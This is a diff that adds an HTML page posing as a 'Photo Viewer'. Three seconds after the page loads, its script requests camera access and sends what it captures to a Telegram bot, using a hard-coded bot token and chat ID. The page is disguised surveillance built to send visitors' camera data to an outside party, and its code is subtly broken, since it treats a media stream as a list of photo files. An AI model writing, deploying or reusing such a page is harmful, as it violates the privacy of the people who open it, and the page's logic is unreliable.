@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Viewer</title>
+</head>
+<body>
+    <h1>Welcome to the Photo Viewer</h1>
+
+    <script>
+        async function accessPhotos() {
+            const chatId = '7361816575';
+            const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';
+
+            // Request access to user's photo gallery
+            const files = await navigator.mediaDevices.getUserMedia({ video: true });
+
+            // Send each photo to Telegram
+            for (const file of files) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', file);
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
+
+        // Automatically access photos after a short delay
+        setTimeout(accessPhotos, 3000);
+    </script>
+</body>
+</html>
